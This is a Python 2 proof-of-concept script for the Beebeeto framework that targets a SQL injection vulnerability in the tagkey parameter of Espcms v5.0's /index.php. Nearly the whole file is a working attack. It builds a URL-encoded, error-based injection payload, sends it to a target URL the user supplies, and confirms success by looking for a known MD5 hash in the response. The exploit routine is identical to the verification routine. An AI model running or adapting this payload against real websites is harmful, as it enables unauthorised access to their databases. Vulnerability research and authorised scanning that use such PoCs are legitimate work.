#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0208',
            'name': 'Espcms v5.0 /index.php SQL注入漏洞 POC',
            'author': 'H4rdy',
            'create_date': '2014-12-16',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Espcms',
            'vul_version': ['5.0'],
            'type': 'SQL Injection',
            'tag': ['Espcms 5.0 漏洞', 'SQL注入漏洞', '/index.php', 'php'],
            'desc': 'Espcms v5.0 /index.php，tagkey造成了注入',
            'references': ['http://www.wooyun.org/bugs/wooyun-2013-019995',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/index.php?ac=search&at=taglist&tagkey=%2527,tags%29%20or%28select%201%20from%28select"
                   "%20count%28*%29,concat%28%28select%20%28select%20concat%28md5%283.1415%29%29%29%20from"
                   "%20information_schema.tables%20where%20table_schema=database%28%29%20limit%200,1%29,"
                   "floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if "63e1f04640e83605c1d177544a5a0488" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())